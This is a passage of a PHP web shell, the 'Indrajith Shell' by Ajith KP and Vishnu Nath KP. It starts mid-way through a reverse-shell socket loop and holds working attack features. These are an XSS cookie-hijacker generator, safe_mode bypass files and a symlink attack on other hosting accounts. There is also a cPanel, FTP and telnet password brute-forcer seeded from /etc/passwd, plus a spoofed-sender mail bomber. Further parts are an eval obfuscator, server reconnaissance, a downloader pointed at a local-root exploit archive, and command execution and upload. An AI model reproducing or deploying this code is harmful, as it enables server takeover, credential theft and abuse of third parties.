		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
            }
        }
        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        echo "<br /><br /><hr /><br /><br /></div>";
    }
}

function cookie_jack()
{
    global $cookie_highjacker;
    echo "<div id=result><center><h2>NOTICE</h2><hr/>";
    if(function_exists('fopen') && function_exists('fwrite'))
    {
        $cook=gzinflate(base64_decode($cookie_highjacker));
        $han_le=fopen("jith_cookie.php", "w+");
        if($han_le)
        {
            fwrite($han_le, $cook);
            echo "Yes... Cookie highjacker is generated.<br /> Name : <font color=green>jith_cookie.php</font>.<br /> Rename it as 404.php or what you like and highjack cookie of your target.<br />It is useable in XSS<br />It will make a file <font color=red>configuration.txt</font> in this direcory and save the cookie value in it. :p cheers...<br /><br /><hr /><br /><br /></center></div>";
        }
        else
        {
            echo "<font color=red>Sorry... Generate COOKIE HIGHJACKER failed<br /><br /><hr /><br /><br /></center></div>";
        }
    }
}



function safe_mode_fuck()
{
    global $s_php_ini,$s_htaccess,$s_htaccess_pl,$ini_php;
    $path = chdir($_GET['path']);
    chdir($_GET['path']);
    switch($_GET['safe_mode'])
    {
        case "s_php_ini":
            $s_file=$s_php_ini;
            $s_name="php.ini";
            break;
        case "s_htaccess":
            $s_name=".htaccess";
            $s_file=$s_htaccess;
            break;
        case "s_htaccess_pl":
            $s_name=".htaccess";
            $s_file=$s_htaccess_pl;
            break;
        case "s_ini_php":
            $s_name="ini.php";
            $s_file=$ini_php;
            
    }
    if(function_exists('fopen')&& function_exists('fwrite'))
    {
        $s_handle=fopen("$s_name", "a+");
        if($s_handle)
        {
            fwrite($s_handle, $s_file);
            alert("Operation Succeed!!!");
        }
        else
        {
            alert("Access Denied!!!");
        }
        fclose($s_handle);
    }
}
function safe_mode_fuck_ui()
{
    global $path;
    $path=getcwd();
    echo "<div id=result><br /><center><h2>Select Your Options</h2><hr />
    <table class=tbl size=10><tr><td><a href=?path={$path}&amp;safe_mode=s_php_ini>PHP.INI</a></td><td><a href=??path={$path}&amp;safe_mode=s_htaccess>.HTACCESS</a></td><td><a href=??path={$path}&amp;safe_mode=s_htaccess_pl>.HTACCESS(perl)</td><td><a href=?path={$path}&amp;safe_mode=s_ini_php>INI.PHP</td></tr></table><br /><br /></div>";
}
function AccessDenied()
{
    global $path, $forbid_dir;
    $path=$_GET['path'];
    chdir($path);
    if(function_exists('fopen') && function_exists('fwrite'))
    {
        $forbid=fopen(".htaccess", "wb");
        if($forbid)
        {
            fwrite($forbid, $forbid_dir);
            alert("Opreation Succeeded");
        }
        else
        {
            alert("Access Denied");
        }
        fclose($forbid);
    }
}



function sym_link()
{
    cmd('rm -rf AKP');
    mkdir('AKP', 0777);
    $usrd = array();
    $akps = @implode(@file("/etc/named.conf"));
    if(!$file)
    {
        echo("<div id=result><center><h2>Not Found</h2><hr /><font color=red>Sorry, bind file </font>( <font color=green>/etc/named.conf</font> )<font color=red> Not Found</font><br /><br /><hr /><br /><br />");  
    }
    else
    {
        $htaccess=@fopen('AKP/.htaccess', 'w');
        fwrite($htaccess,$sym_htaccess);
        $php_ini_x=fopen('AKP/php.ini', 'w');
        fwrite($php_ini_x, $sym_php_ini);
        symlink("/", "AKP/root");
        echo "<table class=table><tr><td>Domains</td><td>Users</td><td>Exploit</font></td></tr>";
        foreach($akps as $akp)
        {
            if(eregi("zone", $akp))
            {
                preg_match_all('#zone "(.*)" #', $akp, $akpzz);
                flush();
                if(strlen(trim($akpzz[1][0]))>2)
                {
                    $user=posix_getpwuid(@fileowner("/etc/valiases/".$akpzz[1][0]));
                    echo "<tr><td><a href=http://www.".$akpzz[1][0]." target=_blank>".$akpzz[1][0]."</a><td>".$user['name']."</td><td><a href=/AKP/root/home/".$user['name']."/public_html/ target=_blank>SymLink</a></td></tr></table>";
                    flush();
                }
            }
        }
    }
}

function php_ende_ui()
{
    echo "<div id=result><center><h2>PHP ENCODE/DECODE</h2></center><hr /><form method='post'><table class=tbl>
    <tr><td>
    Method : <select name='typed' style='color:green; background-color:black; border:1px solid #666;'><option>Encode</option><option>Decode</decode></select> TYPE : <select name='typenc' style='color:green; background-color:black; border:1px solid #666;'><option>GZINFLATE</option><option>GZUNCOMPRESS</option><option>STR_ROT13</option></tr>
    </td><tr><td><textarea spellcheck='false' class=textarea_edit cols='80' rows='25' name='php_content'>INPUT YOUR CONTENT TO ENCODE/DECODE

For Encode Input your full source code.

For Decode Input the encoded part only.</textarea></tr></td></table><hr /><input class='input_big' type='submit' value='   >>   ' /><br /><hr /><br /><br /></form></div>";
}
function php_ende_bg()
{
    $meth_d=$_POST['typed'];
    $typ_d=$_POST['typenc'];
    $c_ntent=$_POST['php_content'];
    $c_ntent=$c_ntent;
    switch($meth_d)
    {
        case "Encode":
            switch($typ_d)
            {
                case "GZINFLATE":
                    $res_t=base64_encode(gzdeflate(trim(stripslashes($c_ntent.' '),'<?php, ?>'),9));
                    $res_t="<?php /* Encoded in INDRAJITH SHELL PROJECT */ eval(gzinflate(base64_decode(\"$res_t\"))); ?>";
                    break;
                case "GZUNCOMPRESS":
                    $res_t=base64_encode(gzcompress(trim(stripslashes($c_ntent.' '),'<?php, ?>'),9));
                    $res_t="<?php /* Encoded in INDRAJITH SHELL PROJECT */ eval(gzuncompress(base64_decode(\"$res_t\"))); ?>";
                    break;
                case "STR_ROT13":
                    $res_t=trim(stripslashes($c_ntent.' '),'<?php, ?>');
                    $res_t=base64_encode(str_rot13($res_t));
                    $res_t="<?php /* Encoded in INDRAJITH SHELL PROJECT */ eval(str_rot13(base64_decode(\"$res_t\"))); ?>";
                    break;                  
            }
        break;
        case "Decode":
            switch($typ_d)
            {
                case "GZINFLATE":
                    $res_t=gzinflate(base64_decode($c_ntent));
                    break;
                case "GZUNCOMPRESS":
                    $res_t=gzuncompress(base64_decode($c_ntent));
                    break;
                case "STR_ROT13":
                    $res_t=str_rot13(base64_decode($c_ntent));
                    break;                  
            }
        break;
    }
    echo "<div id=result><center><h2>INDRAJITH SHELL</h2><hr /><textarea spellcheck='false' class=textarea_edit cols='80' rows='25'>".htmlspecialchars($res_t)."</textarea></center></div>";
}

function massmailer_ui()
{
    echo "<div id=result><center><h2>MASS MAILER & MAIL BOMBER</h2><hr /><table class=tbl width=40 style='col-width:40'><td><table class=tbl><tr style='float:left;'><td><font color=green size=4>Mass Mail</font></td></tr><form method='POST'><tr style='float:left;'><td> FROM : </td><td><input name='from' size=40 value='ajithkp560@fbi.gov'></td></tr><tr  style='float:left;'><td>TO :</td><td><input size=40 name='to_mail' value='ajithkp560@gmail.com,ajithkp560@yahoo.com'></td></tr><tr  style='float:left;'><td>Subject :</td><td><input size=40 name='subject_mail' value='Hi, GuyZ'></td></tr><tr style='float:left;'><td><textarea spellcheck='false' class=textarea_edit cols='34' rows='10' name='mail_content'>I'm doing massmail :p</textarea></td><td><input class='input_big' type='submit' value='   >>   '></td></tr></form></table></td>
    <form method='post'><td> <table class='tbl'><td><font color=green size=4>Mail Bomber</font></td></tr><tr style='float:left;'><td>TO : </td><td><input size=40 name='bomb_to' value='ajithkp560@gmail.com,ajithkp560_mail_bomb@fbi.gov'></td></tr><tr style='float:left;'><td>Subject : </td><td><input size=40 name='bomb_subject' value='Bombing with messages'></td></tr><tr style='float:left;'><td>No. of times</td><td><input size=40 name='bomb_no' value='100'></td></tr><tr style='float:left;'><td> <textarea spellcheck='false' class=textarea_edit cols='34' rows='10' name='bmail_content'>I'm doing  E-Mail Bombing :p</textarea> </td><td><input class='input_big' type='submit' value='   >>   '></td></tr></form></table>   </td></tr></table>";
}

function massmailer_bg()
{
    $from=$_POST['from'];
    $to=$_POST['to_mail'];
    $subject=$_POST['subject_mail'];
    $message=$_POST['mail_content'];
    if(function_exists('mail'))
    {
        if(mail($to,$subject,$message,"From:$from"))
        {
            echo "<div id=result><center><h2>MAIL BOMBING</h2><hr /><br /><br /><font color=green size=4>Successfully Mails Send... :p</font><br /><br /><hr /><br /><br />";
        }
        else
        {
            echo "<div id=result><center><h2>MAIL BOMBING</h2><hr /><br /><br /><font color=red size=4>Sorry, failed to Mails Sending... :(</font><br /><br /><hr /><br /><br />";
        }
    }
    else
    {
        echo "<div id=result><center><h2>MAIL BOMBING</h2><hr /><br /><br /><font color=red size=4>Sorry, failed to Mails Sending... :(</font><br /><br /><hr /><br /><br />";
    }
}

function mailbomb_bg()
{
    $rand=rand(0, 9999999);
    $to=$_POST['bomb_to'];
    $from="president_$rand@whitewhitehouse.gov";
    $subject=$_POST['bomb_subject']." ID ".$rand;
    $times=$_POST['bomb_no'];
    $content=$_POST['bmail_content'];
    if($times=='')
    {
        $times=1000;
    }
    while($times--)
    {
        if(function_exists('mail'))
        {
            if(mail($to,$subject,$message,"From:$from"))
            {
                echo "<div id=result><center><h2>MAIL BOMBING</h2><hr /><br /><br /><font color=green size=4>Successfully Mails Bombed... :p</font><br /><br /><hr /><br /><br />";
            }
            else
            {
                echo "<div id=result><center><h2>MAIL BOMBING</h2><hr /><br /><br /><font color=red size=4>Sorry, failed to Mails Bombing... :(</font><br /><br /><hr /><br /><br />";
            }
        }
        else
        {
            echo "<div id=result><center><h2>MAIL BOMBING</h2><hr /><br /><br /><font color=red size=4>Sorry, failed to Mails Bombing... :(</font><br /><br /><hr /><br /><br />";
        }
    }
}


/* ----------------------- CPANEL CRACK is Copied from cpanel cracker ----------*/
/*------------------------ Credit Goes to Them ---------------------------------*/
function cpanel_check($host,$user,$pass,$timeout)
{
    set_time_limit(0);
    global $cpanel_port;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://$host:" . $cpanel_port);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    $data = curl_exec($ch);
    if ( curl_errno($ch) == 28 )
    {
        print "<b><font color=orange>Error :</font> <font color=red>Connection Timeout. Please Check The Target Hostname .</font></b>";
        exit;
    }
    else if (curl_errno($ch) == 0 )
    {
        print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"orange\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"green\">
        Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\" and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
    }
    curl_close($ch);
}

function cpanel_crack()
{
    set_time_limit(0);
    global $os;
    echo "<div id=result>";
    $cpanel_port="2082";
		$connect_timeout=5;
		if(!isset($_POST['username']) && !isset($_POST['password']) && !isset($_POST['target']) && !isset($_POST['cracktype']))
		{
		?>
		<center>
		<form method=post>
		<table class=tbl>
			<tr>
				<td align=center colspan=2>Target : <input type=text name="server" value="localhost" class=sbox></td>
			</tr>
			<tr>
				<td align=center>User names</td><td align=center>Password</td>
			</tr>
			<tr>
				<td align=center><textarea spellcheck='false' class=textarea_edit name=username rows=25 cols=35 class=box><?php 
				if($os != "win")
				{
					if(@file('/etc/passwd'))
					{
						$users = file('/etc/passwd');
						foreach($users as $user) 
						{
							$user = explode(':', $user);
							echo $user[0] . "\n";
						}
					}
					else
					{
						$temp = "";
						$val1 = 0;
						$val2 = 1000;
						for(;$val1 <= $val2;$val1++) 
						{
							$uid = @posix_getpwuid($val1);
							if ($uid)
								 $temp .= join(':',$uid)."\n";
						 }
						
						 $temp = trim($temp);
							 
						 if($file5 = fopen("test.txt","w"))
						 {
							fputs($file5,$temp);
							 fclose($file5);
							 
							 $file = fopen("test.txt", "r");
							 while(!feof($file))
							 {
							 	$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/","",$matches[1]);
								if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo $matches;
							}
							fclose($file);
						}
					}
				}
				 ?></textarea></td><td align=center><textarea spellcheck='false' class=textarea_edit name=password rows=25 cols=35 class=box></textarea></td>
			</tr>
			<tr>
				<td align=center colspan=2>Guess options : <label><input name="cracktype" type="radio" value="cpanel" checked> Cpanel(2082)</label><label><input name="cracktype" type="radio" value="ftp"> Ftp(21)</label><label><input name="cracktype" type="radio" value="telnet"> Telnet(23)</label></td>
			</tr>
			<tr>
				<td align=center colspan=2>Timeout delay : <input type="text" name="delay" value=5 class=sbox></td>
			</tr>
			<tr>
				<td align=center colspan=2><input type="submit" value="   Go    " class=but></td>
			</tr>
		</table>
		</form>
		</center>
		<?php
		}
		else
		{
			if(empty($_POST['username']) || empty($_POST['password']))
				echo "<center>Please Enter The Users or Password List</center>";
			else
			{
				$userlist=explode("\n",$_POST['username']);
				$passlist=explode("\n",$_POST['password']);
	
				if($_POST['cracktype'] == "ftp")
				{
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);
						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							ftp_check($_POST['target'],$pureuser,$purepass,$connect_timeout);
						}
					}
				}
				if ($_POST['cracktype'] == "cpanel" || $_POST['cracktype'] == "telnet")
				{
					if($cracktype == "telnet")
					{
						$cpanel_port="23";
					}
					else
						$cpanel_port="2082";
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);
						echo "<b><font face=Tahoma style=\"font-size: 9pt\" color=#008000> [ - ] </font><font face=Tahoma style=\"font-size: 9pt\" color=#FF0800>
						Processing user $pureuser ...</font></b><br><br>";
						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							cpanel_check($_POST['target'],$pureuser,$purepass,$connect_timeout);
						}
					}
				}
			}
		}
                
    echo "</div>";
}

function get_users()
{
    $userz = array();
    $user = file("/etc/passwd");
    foreach($user as $userx=>$usersz)
    {
            $userct = explode(":",$usersz);
            array_push($userz,$userct[0]);
    }
    if(!$user)
    {
        if($opd = opendir("/home/"))
        {
            while(($file = readdir($opd))!== false)
            {
                array_push($userz,$file);
            }
        }
        closedir($opd);
    }
    $userz=implode(', ',$userz);
    return $userz;
}

function exploit_details()
{
    global $os;
    echo "<div id=result style='color:green;'><center>
    <h2>Exploit Server Details</h2><hr /><br /><br /><table class=table style='color:green;text-align:center'><tr><td>
    OS: <a style='color:7171C6;text-decoration:none;' target=_blank href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=".php_uname(s)."'>".php_uname(s)."</td></tr>
    <tr><td>PHP Version : <a style='color:7171C6;text-decoration:none;' target=_blank href='?phpinfo'>".phpversion().".</td></tr>
    <tr><td>Kernel Release : <font color=7171C6>".php_uname(r)."</font></td></tr>
    <tr><td>Kernel Version : <font color=7171C6>".php_uname(v)."</font></td></td>
    <tr><td>Machine : <font color=7171C6>".php_uname(m)."</font></td</tr>
    <tr><td>Server Software : <font color=7171C6>".$_SERVER['SERVER_SOFTWARE']."</font></td</tr><tr>";
    if(function_exists('apache_get_modules'))
    {
	echo "<tr><td style='text-align:left;'>Loaded Apache modules : <br /><br /><font color=7171C6>";
        echo implode(', ', apache_get_modules());
        echo "</font></tr></td>";
    }
    if($os=='win')
    {
        echo  "<tr><td style='text-align:left;'>Account Setting : <font color=7171C6><pre>".cmd('net accounts')."</pre></td></tr>
               <tr><td style='text-align:left'>User Accounts : <font color=7171C6><pre>".cmd('net user')."</pre></td></tr>
               ";
    }
    if($os=='nix')
    {
        echo "<tr><td style='text-align:left'>Distro : <font color=7171C6><pre>".cmd('cat /etc/*-release')."</pre></font></td></tr>
              <tr><td style='text-align:left'>Distr name : <font color=7171C6><pre>".cmd('cat /etc/issue.net')."</pre></font></td></tr>
              <tr><td style='text-align:left'>GCC : <font color=7171C6><pre>".cmd('whereis gcc')."</pre></td></tr>
              <tr><td style='text-align:left'>PERL : <font color=7171C6><pre>".cmd('whereis perl')."</pre></td></tr>
              <tr><td style='text-align:left'>PYTHON : <font color=7171C6><pre>".cmd('whereis python')."</pre></td></tr>
              <tr><td style='text-align:left'>JAVA : <font color=7171C6><pre>".cmd('whereis java')."</pre></td></tr>
              <tr><td style='text-align:left'>APACHE : <font color=7171C6><pre>".cmd('whereis apache')."</pre></td></tr>
              <tr><td style='text-align:left;'>CPU : <br /><br /><pre><font color=7171C6>".cmd('cat /proc/cpuinfo')."</font></pre></td></tr>
              <tr><td style='text-align:left'>RAM : <font color=7171C6><pre>".cmd('free -m')."</pre></td></tr>
              <tr><td style='text-align:left'> User Limits : <br /><br /><font color=7171C6><pre>".cmd('ulimit -a')."</pre></td></tr>";
              $useful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
              $uze=array();
              foreach($useful as $uzeful)
              {
                if(cmd("which $uzeful"))
                {
                    $uze[]=$uzeful;
                }
              }
              echo "<tr><td style='text-align:left'>Useful : <br /><font color=7171C6><pre>";
              echo implode(', ',$uze);
              echo "</pre></td></tr>";
              $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
              $uze=array();
              foreach($downloaders as $downloader)
              {
                if(cmd("which $downloader"))
                {
                    $uze[]=$downloader;
                }
              }
              echo "<tr><td style='text-align:left'>Downloaders : <br /><font color=7171C6><pre>";
              echo implode(', ',$uze);
              echo "</pre></td></tr>";
              echo "<tr><td style='text-align:left'>Users : <br /><font color=7171C6><pre>".wordwrap(get_users())."</pre</font>></td></tr>
                    <tr><td style='text-align:left'>Hosts : <br /><font color=7171C6><pre>".cmd('cat /etc/hosts')."</pre></font></td></tr>";
    }
    echo "</table><br /><br /><hr /><br /><br />";
}

function remote_file_check_ui()
{
    echo "<div id=result><center><h2>Remote File Check</h2><hr /><br /><br />
          <table class=tbl><form method='POST'><tr><td>URL : <input size=50 name='rem_web' value='http://www.ajithkp560.hostei.com/php/'></td></tr>
          <tr><td><font color=red>Input File's Names in TextArea</font></tr></td><tr><td><textarea spellcheck='false' class='textarea_edit' cols=50 rows=30 name='tryzzz'>indrajith.php
ajithkp560.php
index.html
profile.php
c99.php
r57.php</textarea></td></tr>
         <tr><td><br /><input type='submit' value='   >>   ' class='input_big' /><br /><br /></td></tr></form></table><br /><br /><hr /><br /><br />";
}

function remote_file_check_bg()
{
    set_time_limit(0);
    $rtr=array();
    echo "<div id=result><center><h2>Scanner Report</h2><hr /><br /><br /><table class=tbl>";
    $webz=$_POST['rem_web'];
    $uri_in=$_POST['tryzzz'];
    $r_xuri = trim($uri_in);
    $r_xuri=explode("\n", $r_xuri);
    foreach($r_xuri as $rty)
    {
         $urlzzx=$webz.$rty;
         if(function_exists('curl_init'))
         {
            echo "<tr><td style='text-align:left'><font color=orange>Checking : </font> <font color=7171C6> $urlzzx </font></td>";
            $ch = curl_init($urlzzx);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_exec($ch);
            $status_code=curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if($status_code==200)
            {
                echo "<td style='text-align:left'><font color=green> Found....</font></td></tr>";
            }
            else
            {
                echo "<td style='text-align:left'><font color=red>Not Found...</font></td></tr>";
            }
         }
         else
         {
            echo "<font color=red>cURL Not Found</font>";
        }
    }
    echo "</table><br /><br /><hr /><br /><br /></div>";
}

function remote_download_ui()
{
    echo "<div id=result><center><h2>Remote File Download</h2><hr /><br /><br /><table class=tbl><form method='GET'><input type=hidden name='path' value=".getcwd()."><tr><td><select style='color:green; background-color:black; border:1px solid #666;' name='type_r_down'><option>WGET</option><option>cURL</option></select></td></tr>
    <tr><td>URL <input size=50 name='rurlfile' value='ajithkp560.hostei.com/localroot/2.6.x/h00lyshit.zip'></td></tr>
    <tr><td><input type='submit' class='input_big' value='   >>   ' /></td></tr></form></table><br /><br /><hr /><br /><br /></div>";
}

function remote_download_bg()
{
    chdir($_GET['path']);
    global $os;
    $opt=$_GET['type_r_down'];
    $rt_ffile=$_GET['rurlfile'];
    $name=basename($rt_ffile);
    echo "<div id=result>";
    switch($opt)
    {
        case "WGET":
            if($os!='win')
            {
                cmd("wget $rt_ffile");
                alert("Downloaded Successfully...");
            }
            else
            {
                alert("Its Windows OS... WGET is not available");
            }
            break;
        case "cURL":
            if(function_exists('curl_init'))
            {
                $ch = curl_init($rt_ffile);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $data = curl_exec($ch);
                curl_close($ch);
                file_put_contents($name, $data);
                alert("Download succeeded");
            }
            else
            {
                alert("cURL Not Available");
            }
            break;
    }
    echo "</div>";
}

function hex_encode_ui()
{
    if(isset($_REQUEST['hexinp']) && isset($_REQUEST['tyxxx']))
    {
        $tyx=$_POST['tyxxx'];
        $rezultzz=$_POST['hexinp'];
        switch($tyx)
        {
            case "Encode":
                $rzul=PREG_REPLACE("'(.)'e","dechex(ord('\\1'))",$rezultzz);
                echo "<div id=result><center><h2>HEXADECIMAL ENCODER</h2><hr /><br /><br />
                <textarea class='textarea_edit' spellcheck=false cols=60 rows=10>$rzul</textarea>
                <br /><br /><form method='POST'><select style='color:green; background-color:black; border:1px solid #666;' name='tyxxx'><option>Encode</option><option>Decode</option></select>
                Input : <input name='hexinp' size=50 value='input here'><input type=submit value='   >>  ' /><br /><br /><hr /><br /><br /></div>";
                break;
            case "Decode":
                $rzul=PREG_REPLACE("'([\S,\d]{2})'e","chr(hexdec('\\1'))",$rezultzz);
                echo "<div id=result><center><h2>HEXADECIMAL ENCODER</h2><hr /><br /><br />
                <textarea class='textarea_edit' spellcheck=false cols=60 rows=10>$rzul</textarea>
                <br /><br /><form method='POST'><select style='color:green; background-color:black; border:1px solid #666;' name='tyxxx'><option>Encode</option><option>Decode</option></select>
                Input : <input name='hexinp' size=50 value='input here'><input type=submit value='   >>  ' /><br /><br /><hr /><br /><br /></div>";
                break;
        }
    }
    else
    {
        echo "<div id=result><center><h2>HEXADECIMAL ENCODER</h2><hr /><br /><br />
        <textarea class='textarea_edit' spellcheck=false cols=60 rows=10>Here visible Your Result</textarea>
        <br /><br /><form method='POST'><select style='color:green; background-color:black; border:1px solid #666;' name='tyxxx'><option>Encode</option><option>Decode</option></select>
        Input : <input name='hexinp' size=50 value='input here'><input type=submit value='   >>  ' /><br /><br /><hr /><br /><br /></div>";
    }
}

function about_us()
{
    echo "<div id=result style='boder:1px double dashed #333'><center><h2>About us</h2><hr /><br /><br />
    <font color=red><h4>AJITH KP & VISHNU NATH KP</h4></font>
    We are brothersz & dedicated this to my <br />
    <font color=green>\"Father [Devadasan KP] and Mother[Prakasini AP]\"</font><br />My classmates and teachers.<br />and my buddy <font color=orange>SREEJU</font>
    <br />And all friends, teachers in <font color=green>AMSTECK ATRS AND SCIENCE COLLEGE [BCA & BSc]</font>
    <br /><font color=green>Amteck : Dheeraj, Jhelai, Ashwin, Arjun,etc...<br />
    ToF : Coded32 [who forced me to concentrate in Programming], Null|Void, Al3x,John,etc.<br />
    Indishell : d@rkwolf,ash3ll & Sen[Who teach me the first lessons]</font><br /><br /><br /><br /><hr /><br /><br /><br /><br /></center></div>";
}

function killme()
{
    global $self;
    echo "<div id=result><center><h2>Good Bye Dear</h2><hr />Dear, Good by... :( Hope You Like me...<br /><br /><br/><hr /><br /><br />";
    $me=basename($self);
    unlink($me);
}


//////////////////////////////// Frond End Calls ///////////////////////////////

if(isset($_POST['e_file']) && isset($_POST['e_content_n']))
{
    edit_file_bg();
}

else if(isset($_REQUEST['killme']))
{
    killme();
}

else if(isset($_REQUEST['hexenc']))
{
    hex_encode_ui();
}

else if(isset($_REQUEST['about_us']))
{
    about_us();
}

else if(isset($_REQUEST['remotefiledown']))
{
    remote_download_ui();
}

else if(isset($_GET['type_r_down']) && isset($_GET['rurlfile']) && isset($_GET['path']))
{
    remote_download_bg();
}

else if(isset($_REQUEST['cpanel_crack']))
{
    cpanel_crack();
}

else if(isset($_REQUEST['rem_web']) && isset($_REQUEST['tryzzz']))
{
    remote_file_check_bg();
}

else if(isset($_REQUEST['typed']) && isset($_REQUEST['typenc']) && isset($_REQUEST['php_content']))
{
    php_ende_bg();
}

else if(isset($_REQUEST['remote_server_scan']))
{
    remote_file_check_ui();
}

else if(isset($_REQUEST['server_exploit_details']))
{
    exploit_details();
}

else if(isset($_REQUEST['from']) && isset($_REQUEST['to_mail']) && isset($_REQUEST['subject_mail']) && isset($_REQUEST['mail_content']))
{
    massmailer_bg();
}

else if(isset($_REQUEST['mysqlman']))
{
    mysqlman();
}

else if(isset($_REQUEST['bomb_to']) && isset($_REQUEST['bomb_subject']) && isset($_REQUEST['bmail_content']))
{
    mailbomb_bg();
}

else if(isset($_REQUEST['cookiejack']))
{
    cookie_jack();
}

else if(isset($_REQUEST['massmailer']))
{
    massmailer_ui();
}

else if(isset($_REQUEST['rename']))
{
    chdir($_GET['path']);
    rename_ui();
}

else if(isset($_GET['old_name']) && isset($_GET['new_name']))
{
    chdir($_GET['path']);
    
    rename_bg();
    
}
else if(isset($_REQUEST['encodefile']))
{
    php_ende_ui();
}
else if(isset($_REQUEST['edit']))
{
    edit_file(); 
}
else if(isset($_REQUEST['down']))
{
    chdir($_GET['path']);
    download();
      
}
else if(isset($_REQUEST['read']))
{
    chdir($_GET['path']);
    code_viewer();
    
}
else if(isset($_REQUEST['perm']))
{
    chdir($_GET['path']);
    ch_perm_ui();
}
else if(isset($_GET['path']) && isset($_GET['p_filex']) && isset($_GET['new_perm']))
{
    chdir($_GET['path']);
    ch_perm_bg();
}

else if(isset($_REQUEST['del_fil']))
{
    chdir($_GET['path']);
    delete_file();
    exit;
}
else if(isset($_REQUEST['phpinfo']))
{
    chdir($_GET['path']);
    ob_clean();
    echo phpinfo();
    exit;
}
else if(isset($_REQUEST['del_dir']))
{
    chdir($_GET['path']);
    $d_dir=$_GET['del_dir'];
    deldirs($d_dir);
}
else if(isset($_GET['path']) && isset($_GET['new_file']))
{
    chdir($_GET['path']);
    mk_file_ui();
}
else if(isset($_GET['path']) && isset($_GET['new_f_name']) && isset($_GET['n_file_content']))
{
    mk_file_bg();
}
else if(isset($_GET['path']) && isset($_GET['new_dir']))
{
    chdir($_GET['path']);
    create_dir();
}
else if(isset($_GET['path']) && isset($_GET['cmdexe']))
{
    chdir($_GET['path']);
    cmd();
}
else if(isset($_POST['upload_f']) && isset($_POST['path']))
{
    upload_file();
}
else if(isset($_REQUEST['rs']))
{
    reverse_conn_ui();
}
else if(isset($_GET['rev_option']) && isset($_GET['my_ip']) && isset($_GET['my_port']))
{
    reverse_conn_bg();
}
else if(isset($_REQUEST['safe_mod']) && isset($_REQUEST['path']))
{
    chdir($_GET['path']);
    safe_mode_fuck_ui();
}
else if(isset($_GET['path']) && isset($_GET['safe_mode']))
{
    safe_mode_fuck();
}
else if(isset($_GET['path']) && isset($_REQUEST['forbd_dir']))
{
    AccessDenied();
}


else if(isset($_REQUEST['symlink']))
{
    sym_link();
}

else if(isset($_GET['dbz']) && isset($_GET['db_user']) && isset($_GET['db_password']) && isset($_GET['db_port']))
{
    SQL_Shell_bg();
}
else if(isset($_GET['path']) && isset($_GET['copy']))
{
    copy_file_ui();
}
else if(isset($_GET['c_file']) && isset($_GET['c_target']) &&isset($_GET['cn_name']))
{
    copy_file_bg();
}
else
{
    filemanager_bg();
}

////////////////////////////// End Frond End Calls //////////////////////////////


echo "</div><div id=result><center><p><table class='tbl'>
      <tr><td><form method='GET'>PWD : <input size='50' name='path' value=".getcwd()."><input type='submit' value='   >>   ' /></form></td></tr></table>
      <table class='tbl'><tr>
          <td><form style='float:right;' method='GET'><input name='path' value=".getcwd()." type=hidden><span> New File : </span><input type='submit' value='   >>   ' ><input size='40' name='new_file' /></form>
          </td>
          <td><form  style='float:left;' method='GET'><input name='path' value=".getcwd()." type=hidden><input size='40' name='new_dir'><input type='submit' value='   >>   ' /><span> : New Dir</span></form>
          </td>
      </tr>
      <tr>
          <td><form style='float:right;' method='GET'><input style='float:left;' name='path' value=".getcwd()." type=hidden><span>CMD : </span><input type='submit' value='   >>   ' ><input name='cmdexe' size='40' /></form>
          </td>
          <td><form style='float:left;' method='POST' enctype=\"multipart/form-data\"><input name='path' value=".getcwd()." type=hidden><input size='27' name='upload_f' type='file'><input type='submit' name='upload_f' value='   >>   ' /><span> : Upload File</span></form>
          </td>
        </tr>
      </table></p><p><font size=4 color=green>&copy <a style='color:green; text-decoration:none;' href=http://facebook.com/ajithkp560>AJITH KP</a> & <a style='color:green; text-decoration:none;' href='http://www.facebook.com/vishnunathkp'>VISHNU NATH KP</a> &copy</font><br />&reg TOF [2012] &reg</div>"
?>
